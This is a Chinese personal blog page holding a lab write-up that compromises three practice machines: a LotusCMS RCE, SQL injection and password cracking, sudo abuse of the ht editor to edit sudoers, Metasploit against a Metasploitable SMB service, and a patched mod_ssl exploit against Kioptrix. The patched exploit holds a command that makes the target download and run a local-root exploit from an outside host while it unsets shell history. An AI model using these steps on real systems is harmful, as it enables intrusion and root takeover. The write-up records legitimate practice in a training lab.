@@ -1,0 +1,263 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>某靶场writeup | 最后的家</title><meta name="keywords" content="LotusCMS,mod_ssl"><meta name="author" content="Fre4k5en"><meta name="copyright" content="Fre4k5en"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="192.168.100.187Information gatheringnmap扫了一下存活  从下往上一台一台看吧，187    Enumeration &amp; getshell可以看到LotusCMS字样，搜索后发现3.0登录界面一致，存在RCE漏洞 https:&#x2F;&#x2F;github.com&#x2F;Hood3dRob1n&#x2F;LotusCMS-Exploit  得到一个不稳定的shell 1python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某靶场writeup">
+<meta property="og:url" content="http://fre4k5en.me/2021/01/14/%E6%9F%90%E9%9D%B6%E5%9C%BAwriteup/">
+<meta property="og:site_name" content="最后的家">
+<meta property="og:description" content="192.168.100.187Information gatheringnmap扫了一下存活  从下往上一台一台看吧，187    Enumeration &amp; getshell可以看到LotusCMS字样，搜索后发现3.0登录界面一致，存在RCE漏洞 https:&#x2F;&#x2F;github.com&#x2F;Hood3dRob1n&#x2F;LotusCMS-Exploit  得到一个不稳定的shell 1python">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8hgwzr1j30pm0pydne.jpg">
+<meta property="article:published_time" content="2021-01-14T06:58:34.000Z">
+<meta property="article:modified_time" content="2021-07-09T11:15:16.429Z">
+<meta property="article:author" content="Fre4k5en">
+<meta property="article:tag" content="LotusCMS">
+<meta property="article:tag" content="mod_ssl">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8hgwzr1j30pm0pydne.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://fre4k5en.me/2021/01/14/%E6%9F%90%E9%9D%B6%E5%9C%BAwriteup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?980a0f26f7aefb599af14da60901958e";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-09 19:15:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://tva1.sinaimg.cn/large/008i3skNgy1gs3mb17khej30j10j1aas.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">最后的家</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">某靶场writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-14T06:58:34.000Z" title="发表于 2021-01-14 14:58:34">2021-01-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-09T11:15:16.429Z" title="更新于 2021-07-09 19:15:16">2021-07-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="某靶场writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h3 id="192-168-100-187"><a href="#192-168-100-187" class="headerlink" title="192.168.100.187"></a>192.168.100.187</h3><h4 id="Information-gathering"><a href="#Information-gathering" class="headerlink" title="Information gathering"></a>Information gathering</h4><p>nmap扫了一下存活</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8hgwzr1j30pm0pydne.jpg" alt="image-20210114150127187"></p>
+<p>从下往上一台一台看吧，187</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8ipi5j2j30k2070t9m.jpg" alt="image-20210114150242045"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8j9tw97j315k0m6mzi.jpg" alt="image-20210114150313595"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8jgsdsej30mg0im0ts.jpg" alt="image-20210114150326277"></p>
+<h4 id="Enumeration-amp-getshell"><a href="#Enumeration-amp-getshell" class="headerlink" title="Enumeration &amp; getshell"></a>Enumeration &amp; getshell</h4><p>可以看到LotusCMS字样，搜索后发现3.0登录界面一致，存在RCE漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Hood3dRob1n/LotusCMS-Exploit">https://github.com/Hood3dRob1n/LotusCMS-Exploit</a></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8kxt17bj30ts0sydj1.jpg" alt="image-20210114150449790"></p>
+<p>得到一个不稳定的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8psmd8tj30o805wdgo.jpg" alt="image-20210114150930534"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmne1gu0r3j30vz0u0wl4.jpg" alt="image-20210114181342877"></p>
+<p>home目录下loneferret存在.sudo_as_admin_successful文件，判断存在sudo权限</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmne2ur9i3j30wq0fy0w0.jpg" alt="image-20210114181503377"></p>
+<h4 id="User-shell"><a href="#User-shell" class="headerlink" title="User shell"></a>User shell</h4><p>翻看了目录，找到了一个admin的hash，由于shell一直不能运行linpeas，</p>
+<p>翻看网上资料，发现/gallery/gallery.php有处注入，还是自己不仔细呀，下次一定要更仔细一点才行</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmndwdecjrj30wo0ci400.jpg" alt="image-20210114180849365"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmndy2eefdj30uc08k0ts.jpg" alt="image-20210114181027363"></p>
+<p>第一个表gallerific_users里面的账号密码暂时没发现怎么用</p>
+<p>第二个表dev_accouts里面爆出了之前我们看到的两个本地用户dreg和loneferret，sqlmap自带的字典就能爆出md5</p>
+<p>ssh使用密码starwars连接loneferret，成功<strong>（老emo人+星战粉了💔</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmne52myyoj30oo030jrs.jpg" alt="image-20210114181711360"></p>
+<h4 id="Root-shell"><a href="#Root-shell" class="headerlink" title="Root shell"></a>Root shell</h4><p>查看拥有哪些sudo权限，发现这里有ht，一款编辑器</p>
+<p><img src="/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20210118102507007.png" alt="image-20210118102507007"></p>
+<p>直接执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/local/bin/ht</span><br></pre></td></tr></table></figure>
+
+<p>会报错，这里我们把终端换为xterm</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmrvod9ikvj30n803saat.jpg" alt="image-20210118152610648"></p>
+<p>使用ht编辑我们的sudoers，增加一个/bin/bash</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmrn184d6ej30vs0regp7.jpg" alt="image-20210118102708366"></p>
+<p>F2保存F10退出，而后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>成功get root shell</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmrn363j5rj30hu03qaam.jpg" alt="image-20210118102901010"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmrvt4mwhej30oq01u74j.jpg" alt="image-20210118153045267"></p>
+<p>没有找到arp表中其它机器</p>
+<hr>
+<h3 id="192-168-100-175"><a href="#192-168-100-175" class="headerlink" title="192.168.100.175"></a>192.168.100.175</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-18 15:32 CST</span><br><span class="line">Nmap scan report for 192.168.100.175</span><br><span class="line">Host is up (0.072s latency).</span><br><span class="line">Not shown: 988 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         ProFTPD 1.3.1</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)</span><br><span class="line">|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)</span><br><span class="line">23/tcp   open  telnet      Linux telnetd</span><br><span class="line">25/tcp   open  smtp        Postfix smtpd</span><br><span class="line">|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,</span><br><span class="line">53/tcp   open  domain      ISC BIND 9.4.2</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: 9.4.2</span><br><span class="line">80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5</span><br><span class="line">| mysql-info:</span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.0.51a-3ubuntu5</span><br><span class="line">|   Thread ID: 38</span><br><span class="line">|   Capabilities flags: 43564</span><br><span class="line">|   Some Capabilities: Support41Auth, SupportsTransactions, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, ConnectWithDatabase, SupportsCompression, LongColumnFlag</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|_  Salt: iFdElnd*DUaeWet8Z=_J</span><br><span class="line">|_ssl-cert: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-date: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-alpn: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7</span><br><span class="line">| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX</span><br><span class="line">| Not valid before: 2010-03-17T14:07:45</span><br><span class="line">|_Not valid after:  2010-04-16T14:07:45</span><br><span class="line">|_ssl-date: 2021-01-06T09:33:18+00:00; -11d22h01m15s from scanner time.</span><br><span class="line">8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)</span><br><span class="line">|_ajp-methods: Failed to get a valid response for the OPTION request</span><br><span class="line">8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat/5.5</span><br><span class="line">Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -11d20h21m14s, deviation: 2h53m14s, median: -11d22h01m15s</span><br><span class="line">|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Unix (Samba 3.0.20-Debian)</span><br><span class="line">|   Computer name: metasploitable</span><br><span class="line">|   NetBIOS computer name:</span><br><span class="line">|   Domain name: localdomain</span><br><span class="line">|   FQDN: metasploitable.localdomain</span><br><span class="line">|_  System time: 2021-01-06T04:31:51-05:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>好家伙，竟然直接叫metasploitable…可能是相当于我们平时学习时自己搭的漏洞环境</p>
+<p>一个服务一个服务拿到msf中去跑，smb的漏洞（我也不懂）直接拿到root</p>
+<p>跑不出来shell的话换一个payload就好</p>
+<p><img src="/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20210118180145421.png" alt="image-20210118180145421"></p>
+<p>尝试hashcat跑这三个hash，无果</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gms0pak7jgj30u00xg7bt.jpg" alt="image-20210118182003094"></p>
+<hr>
+<h3 id="192-168-100-166"><a href="#192-168-100-166" class="headerlink" title="192.168.100.166"></a>192.168.100.166</h3><p>照例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap -sC -sV 192.168.100.166</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-21 18:14 CST</span><br><span class="line">Nmap scan report for 192.168.100.166</span><br><span class="line">Host is up (0.069s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</span><br><span class="line">|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</span><br><span class="line">|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">53/tcp    open  domain?</span><br><span class="line">80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">111/tcp   open  rpcbind     2 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2            111/tcp   rpcbind</span><br><span class="line">|   100000  2            111/udp   rpcbind</span><br><span class="line">|   100024  1          32768/tcp   status</span><br><span class="line">|_  100024  1          32768/udp   status</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-09-26T09:32:06</span><br><span class="line">|_Not valid after:  2010-09-26T09:32:06</span><br><span class="line">|_ssl-date: 2021-01-06T13:13:52+00:00; -14d21h02m17s from scanner time.</span><br><span class="line">| sslv2:</span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers:</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">32768/tcp open  status      1 (RPC #100024)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -14d21h02m17s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 74.35 seconds</span><br></pre></td></tr></table></figure>
+
+<p>一个一个searchsploit，发现apache模块mod_ssl 2.8.4存在rce</p>
+<p><img src="/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20210121182155858.png" alt="image-20210121182155858"></p>
+<p>直接开干</p>
+<p>但是发现需要编译，而初次编译的时候会报错，推荐使用kali，这样可以直接安装libssl-dev，mac就有点麻烦了</p>
+<p>装上openssl还是报错，仔细看下发现一个是版本导致的方法名称改变造成的</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmvhqlgf6jj31020nugr0.jpg" alt="image-20210121182610788"></p>
+<p>google之后找到方法，修改c文件</p>
+<p><a target="_blank" rel="noopener" href="https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/">https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/</a></p>
+<p>文件头部添加引用和定义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;openssl/rc4.h&gt;</span><br><span class="line">#include &lt;openssl/md5.h&gt;</span><br><span class="line"></span><br><span class="line">#define SSL2_MT_ERROR 0</span><br><span class="line">#define SSL2_MT_CLIENT_FINISHED 3</span><br><span class="line">#define SSL2_MT_SERVER_HELLO 4</span><br><span class="line">#define SSL2_MT_SERVER_VERIFY 5</span><br><span class="line">#define SSL2_MT_SERVER_FINISHED 6</span><br><span class="line">#define SSL2_MAX_CONNECTION_ID_LENGTH 16</span><br></pre></td></tr></table></figure>
+
+<p>672行（左右，因为刚才加入了新行）替换语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define COMMAND2 &quot;unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n&quot;</span><br></pre></td></tr></table></figure>
+
+<p>970行添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const unsigned char *p, *end;</span><br></pre></td></tr></table></figure>
+
+<p>1078行替换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (EVP_PKEY_get1_RSA(pkey) == NULL) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>1084行替换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&gt;master_key, &amp;buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);</span><br></pre></td></tr></table></figure>
+
+<p>最后编译，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o 764 764.c -lcrypto</span><br><span class="line">./764</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmvhpu8v2fj30uy0oak6t.jpg" alt="image-20210121182527472"></p>
+<p>根据提示找到对应内核和apache版本对应的supported：0x6a、0x6b</p>
